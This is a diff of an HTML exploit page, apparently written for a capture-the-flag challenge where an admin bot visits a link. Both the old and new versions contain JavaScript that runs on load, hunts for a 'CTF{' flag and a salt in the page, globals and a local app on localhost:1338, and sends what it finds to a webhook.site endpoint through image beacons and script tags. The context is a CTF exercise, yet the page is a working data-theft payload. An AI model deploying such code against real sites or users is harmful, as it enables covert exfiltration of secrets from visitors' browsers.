@@ -1,152 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Working Flag Exfiltration</title>
+    <title>Simple Flag Extraction</title>
 </head>
 <body>
-    <h1>Flag Exfiltration</h1>
-    <div id="status">Bot visited! Extracting flag...</div>
+    <h1>Flag Extraction</h1>
+    <div id="status">Extracting flag...</div>
     
     <script>
         const WEBHOOK_URL = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
         
-        function log(msg) {
-            console.log(msg);
-            document.getElementById('status').innerHTML += `<p>${msg}</p>`;
-        }
-        
         async function exfiltrateData(data) {
             const payload = typeof data === 'string' ? data : JSON.stringify(data);
             
-            // Multiple exfiltration methods
-            try {
-                const img = new Image();
-                img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
-                document.body.appendChild(img);
-            } catch (e) {}
+            // Image beacon (most reliable)
+            const img = new Image();
+            img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
+            document.body.appendChild(img);
             
-            try {
-                const script = document.createElement('script');
-                script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
-                document.head.appendChild(script);
-            } catch (e) {}
+            // Script tag backup
+            const script = document.createElement('script');
+            script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
+            document.head.appendChild(script);
         }
         
         async function extractFlag() {
-            log('Starting flag extraction...');
-            
+            // Send confirmation
             await exfiltrateData({
-                status: 'extraction_started',
+                status: 'bot_visited',
                 timestamp: new Date().toISOString()
             });
             
-            try {
-                // The key insight: Navigate to localhost:1338 in the SAME window
-                // This bypasses cross-origin restrictions because we're in the same context
-                log('Navigating to localhost:1338 in same window...');
+            // Check if mathRandomInvocations exists in global scope
+            if (typeof mathRandomInvocations !== 'undefined' && mathRandomInvocations.length > 0) {
+                const salt = mathRandomInvocations[mathRandomInvocations.length - 1];
                 
-                // Use setTimeout to allow webhook to send first
-                setTimeout(() => {
-                    // Navigate to the main application
-                    window.location.href = 'http://localhost:1338';
-                }, 2000);
-                
-                // Set up a check for when we're on localhost:1338
-                const checkForFlag = setInterval(async () => {
-                    if (window.location.hostname === 'localhost' && window.location.port === '1338') {
-                        log('Successfully navigated to main app!');
-                        clearInterval(checkForFlag);
-                        
-                        // Now we can access mathRandomInvocations directly!
-                        if (typeof mathRandomInvocations !== 'undefined' && mathRandomInvocations.length > 0) {
-                            const salt = mathRandomInvocations[mathRandomInvocations.length - 1];
-                            log(`Found salt: ${salt}`);
-                            
-                            await exfiltrateData({
-                                salt: salt,
-                                salts_array: mathRandomInvocations,
-                                message: 'Found mathRandomInvocations on localhost:1338'
-                            });
-                            
-                            // Try to find and click the flag file
-                            const filesList = document.querySelector('#filesList');
-                            if (filesList) {
-                                const flagFile = Array.from(filesList.children).find(
-                                    el => el.dataset.name === 'flag.txt'
-                                );
-                                
-                                if (flagFile) {
-                                    log('Found flag file, clicking it...');
-                                    flagFile.click();
-                                    
-                                    // Wait for flag to load in preview iframe
-                                    setTimeout(async () => {
-                                        const previewIframe = document.querySelector('#previewIframe');
-                                        if (previewIframe) {
-                                            try {
-                                                // Try to access the SafeFrame content
-                                                const flagContent = previewIframe.contentDocument.body.innerText;
-                                                if (flagContent && flagContent.includes('CTF{')) {
-                                                    log(`🚩 FLAG FOUND: ${flagContent}`);
-                                                    
-                                                    await exfiltrateData({
-                                                        flag: flagContent,
-                                                        method: 'direct_navigation',
-                                                        timestamp: new Date().toISOString()
-                                                    });
-                                                    
-                                                    // Send just the flag
-                                                    await exfiltrateData(flagContent);
-                                                    
-                                                    document.body.innerHTML = 
-                                                        `<h1 style="color: green;">FLAG SENT: ${flagContent}</h1>`;
-                                                }
-                                            } catch (e) {
-                                                log('SafeFrame access failed: ' + e.message);
-                                                await exfiltrateData({
-                                                    error: 'SafeFrame access failed',
-                                                    details: e.message
-                                                });
-                                            }
-                                        }
-                                    }, 3000);
-                                }
-                            }
-                        }
-                        
-                        // Also try to extract flag from page HTML
-                        const pageContent = document.documentElement.innerHTML;
-                        const flagMatch = pageContent.match(/CTF\{[^}]+\}/);
-                        if (flagMatch) {
-                            const flag = flagMatch[0];
-                            log(`🚩 FLAG FOUND in HTML: ${flag}`);
-                            
-                            await exfiltrateData({
-                                flag: flag,
-                                method: 'html_extraction'
-                            });
-                            
-                            await exfiltrateData(flag);
-                        }
-                    }
-                }, 1000);
-                
-                // Stop checking after 30 seconds
-                setTimeout(() => clearInterval(checkForFlag), 30000);
-                
-            } catch (error) {
-                log(`Extraction failed: ${error.message}`);
                 await exfiltrateData({
-                    error: 'extraction_failed',
-                    details: error.message
+                    salt: salt,
+                    salts_array: mathRandomInvocations,
+                    message: 'Found mathRandomInvocations directly!'
+                });
+                
+                // Now we have the salt, we can construct the SafeFrame URL and get the flag
+                // But actually, let's check if the flag is already in the DOM or accessible
+                
+                // Check all global variables for flag
+                for (let prop in window) {
+                    if (window[prop] && typeof window[prop] === 'string' && window[prop].includes('CTF{')) {
+                        await exfiltrateData({
+                            flag: window[prop],
+                            method: 'global_variable',
+                            property: prop
+                        });
+                    }
+                }
+                
+                // Check document content
+                const pageContent = document.documentElement.innerHTML;
+                const flagMatch = pageContent.match(/CTF\{[^}]+\}/);
+                if (flagMatch) {
+                    await exfiltrateData({
+                        flag: flagMatch[0],
+                        method: 'document_content'
+                    });
+                }
+                
+            } else {
+                await exfiltrateData({
+                    error: 'mathRandomInvocations not found',
+                    global_vars: Object.keys(window).filter(k => k.includes('math') || k.includes('random') || k.includes('salt'))
                 });
             }
         }
         
         // Start extraction
         extractFlag();
-        
-        log('Extraction script loaded and running...');
     </script>
 </body>
 </html>
